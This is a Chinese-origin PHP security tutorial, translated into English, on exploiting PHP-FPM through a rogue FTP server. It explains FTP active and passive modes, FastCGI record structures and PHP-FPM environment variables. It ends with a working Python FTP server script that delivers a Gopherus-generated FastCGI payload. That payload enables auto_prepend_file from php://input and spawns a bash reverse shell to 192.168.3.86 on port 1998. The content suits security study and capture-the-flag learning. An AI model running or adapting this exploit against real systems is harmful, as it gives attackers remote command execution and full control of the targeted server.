# PHP Safe Learning—FTP

Author: H3rmesk1t

# Two transmission modes of FTP
<img src="./images/1.png" alt="">

> Let’s first understand the two transmission modes of FTP: active mode (PORT mode), passive mode (PASV mode)

> Two TCP connections need to be established between the FTP client and the server
```
(1) Control connection: Send control commands
(2) Data connection: used for file transfer
```
> For both transmission modes, the process of establishing the control connection is the same, both of which are the server listening to port 21, and the client initiates a TCP connection to this port of the server; the difference is whether the "server" is in "active" or "passive" during the establishment of the data connection.
> In active mode, after the server knows the port the client listens through the control connection, it uses its own port 20 as the source port to initiate a TCP data connection
> In passive mode, the server listens for a random port of 1024-65525 and tells the client the port through the control connection, which initiates a TCP data connection to the server's port

> When the FTP client is on the private network and the server is on the public network (cloud host application scenario), the FTP passive mode should be used, because in this application scenario, the FTP server cannot access the FTP client on the private network, and the FTP client can access the FTP server.

<img src="./images/2.png" alt="">

# Fastcgi
## Fastcgi Record
> Fastcgi is actually a communication protocol. Like the HTTP protocol, it is a channel for data exchange. The HTTP protocol is a protocol for data exchange between the browser and the server middleware. The browser assembles the HTTP header and HTTP body into a data packet using a certain rule and sends it to the server middleware in TCP. The server middleware decodes the data packet according to the rules, and obtains the data needed by the user as required, and then packages it with the rules of the HTTP protocol to return it to the server.

> Compared with the HTTP protocol, the fastcgi protocol is a protocol for server middleware to exchange data between a certain language backend. The Fastcgi protocol consists of multiple records. Record also has header and body. The server middleware encapsulates these two according to fastcgi rules and sends them to the language backend. After the language backend decodes, the specific data is obtained, and the specific operation is specified. The result is encapsulated according to the protocol and returned to the server middleware.

> Unlike HTTP header, the header of record is fixed by 8 bytes. The body is specified by the contentLength in the header, and its structure is as follows

```C++
typedef struct {
  /* Header */
  unsigned char version; // version
  unsigned char type; // The type of record this time
  unsigned char requestIdB1; // The request id corresponding to this record
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // size of body
  unsigned char contentLengthB0;
  unsigned char paddingLength; // Extra block size
  unsigned char reserved;

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
```
> The header consists of 8 variables of type uchar, each variable is 1 byte, where requestId accounts for two bytes and a unique flag id to avoid the impact between multiple requests; contentLength accounts for two bytes, indicating the size of the body
> After parsing the fastcgi header on the language side, it gets the contentLength, and then reads data with a size equal to contentLength in the TCP stream. This is the body body
> There is an additional piece of data behind the Body. Its length is specified by paddingLength in the header and serves as a retention function. When the Padding is not needed, set its length to 0.
> It can be seen that the maximum supported body size of a fastcgi record structure is 2^16, that is, 65536 bytes

## Fastcgi Type
> type is to specify the function of the record. Because the size of a record in fastcgi is limited and the function is also single, it is necessary to transmit multiple records in a TCP stream, and use type to mark the function of each record, and use requestId as the id of the same request, that is, there will be multiple records for each request, and their requestId is the same

<img src="./images/3.png" alt="">

> After reading this table, it is clear that the server middleware communicates with the backend language. The first data packet is a record with type 1. It communicates with each other later. It sends a record with type 4, 5, 6, and 7. At the end, it sends a record with type 2 and 3. When the backend language receives a record with type 4, it will parse the body of this record into a key-value according to the corresponding structure. The structure of the environment variable is as follows.

```c++
typedef struct {
  unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair11;

typedef struct {
  unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair14;

typedef struct {
  unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair41;

typedef struct {
  unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair44;
```

> These are actually 4 structures. As for which structure to use, there are the following rules

```
Both key and value are less than 128 bytes, use FCGI_NameValuePair11
The key is greater than 128 bytes and the value is less than 128 bytes. Use FCGI_NameValuePair41
The key is less than 128 bytes and the value is greater than 128 bytes. Use FCGI_NameValuePair14
key, value
All are greater than 128 bytes, use FCGI_NameValuePair44
```

# PHP-FPM (FastCGI Process Manager)
> FPM is actually a fastcgi protocol parser. Nginx and other server middleware package user requests according to fastcgi rules and pass them to FPM through TCP. FPM parses TCP streams into real data according to fastcgi protocol.

> For example: the user accesses `http://127.0.0.1/index.php?a=1&b=2`, if the web directory is `/var/www/html`, then Nginx will turn this request into the following key-value pair

```C++
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

> This array is actually part of the `$_SERVER` array in PHP, which is the environment variable in PHP. However, the function of the environment variable is not only to fill the `$_SERVER` array, but also to tell fpm which PHP file to execute. PHP-FPM parses after getting the fastcgi data packet to obtain the above environment variables. Then execute `SCRIPT_FILENAME` value points to the PHP file, that is `/var/www/html/index.php`

# Attack Method
> First use `Gopherus` to construct the Payload and remove the characters after _ in the payload

<img src="./images/4.png" alt="">

> Then play ftp passively

```python
import socket
from urllib.parse import unquote
​
# Make a urldecode the payload generated by gopherus
payload = unquote("%01%01%00%01%00%08%00%00%01%00%00%00%00%00%01%04%00%01%01%15%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_ PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20p hp%3A//input%0F%27SCRIPT_FILENAME/www/wwwroot/127.0.0.1/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%01%00h%04%00%3C%3Fphp% 20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.3.86/1998%200%3E%261%22%27%29%3Bdie%28%27----Made-by-SpyD3r---%0A%27%29%3B%3F%3E%00%00%00%00%00")
payload = payload.encode('utf-8')
​
host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)
​
# Passvie port in ftp passive mode, listen to 1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()
​
# Counter, used to distinguish the number of times the ftp connection is
count = 1
While 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20)) # USER aaa\r\n The username is sent to the client
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")
​
    print(conn.recv(20)) # TYPE I\r\n The client tells the server what format to transfer data. TYPE I represents binary and TYPE A represents text
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")
​
    print(conn.recv(20)) # SIZE /123\r\n Client asks for the size of file /123
    if count == 1:
        conn.send(b"213 3 \n")
    else:
        conn.send(b"300 \n")
​
    print(conn.recv(20)) # EPSV\r\n'
    conn.send(b"200 \n")
​
    print(conn.recv(20)) # PASV\r\n The client tells the server to enter passive connection mode
    if count == 1:
        conn.send(b"227 127,0,0,1,4,210\n") # Fill in your own IP here. The server tells the client which ip:port to obtain data. IP and port are separated by commas, and the calculation rules for the port are: 4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n") # Port calculation rules: 35*256+40=9000
​
    print(conn.recv(20)) # The first connection will receive the command RETR /123\r\n, and the second connection will receive the STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # Tell the client that you can start the data link
        # Create a new socket to return our payload to the server
        print("Make a connection!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("Disconnect!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()
​
    # The first connection is to download the file, and you need to tell the client that the download has ended
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```